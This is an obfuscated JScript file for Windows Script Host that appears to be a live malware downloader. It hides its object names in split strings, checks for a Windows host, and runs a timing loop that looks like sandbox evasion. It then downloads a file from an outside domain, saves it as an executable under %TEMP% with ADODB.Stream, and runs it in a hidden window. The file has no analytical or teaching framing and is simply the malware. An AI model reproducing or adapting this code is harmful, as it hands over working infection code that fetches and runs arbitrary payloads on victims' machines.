var DE = false;
var K = "Create"+"Object";
var I0 = function O() {return WScript[K]("WScript"+".Shell");}(), UK = 11;
var S0 = "MSXML2"+".XMLHTTP";
var F = 2;
var AU = F - 2;
function Z(OE){I0["Run"](OE, AU, AU);};
function SR(){return S0 + "";};
function TF(RU, LE){AU = AU * 1; return RU - LE;};
function WI(){return K;};
/*@cc_on
  @if (@_win32 || @_win64)
    DE = true;
  @end
@*/
if (DE)
{
var I = "";
function Y(){return 22;};
var ZR = 0; var V = 0;
function TR()
{
var AT = new this["Date"]();
var W = AT["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var AT = new this["Date"]();
var KV = AT["getUTCMilliseconds"]();
WScript["Sleep"](Y());
var AT = new this["Date"]();
var R = AT["getUTCMilliseconds"]();
var ZR = "LQ";
ZR = TF(KV, W);
var V = "S";
V = TF(R, KV);
I = "open";
return TF(ZR, V);
}
var ZL = false;
var UC = false;
for (var RZ = AU; RZ < Y() * 1; RZ++){if (TR() != AU){
ZL = true; 
V = "31" + 11 * ZR + V; 
UC = true; 
break;
}}
function BI() {return ((ZL == true) && (ZL == UC)) ? 1 : AU;};
if (ZL && BI() && UC){
function JM() {return I0["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "3bKi5goQ7oXF.ex" + "e";};
 H = SR();
 OG = WScript[K](H);
 var FI = 1;
do { 
	for (;FI;){
	try {
		if (FI == 1)
		{
			OG[I]("GET", "http://a-ntsuhan.com/k38sav", false);
			OG["send"]();
			SI = "Sleep";
			FI = 2;
		}
		WScript[SI](Y() + 120); 
		if (OG["readystate"] < 2 * 2) continue;
		FI = AU;
		function XA(C) {var J = (1, 2, 3, 4, 5, C); return J;};
		N = WScript[WI()]("ADODB.Stream");
		H = N;
		H[I]();
		H["type"] = XA(1);
		H["write"](OG["ResponseBody"]);
		N["position"] = XA(AU);
		H["Save" + "ToFile"](JM(), 2);
		N["cl"+"ose"]();
		A = JM();
		Z(A);
	} catch(AL){};};
}while (FI);
}
}

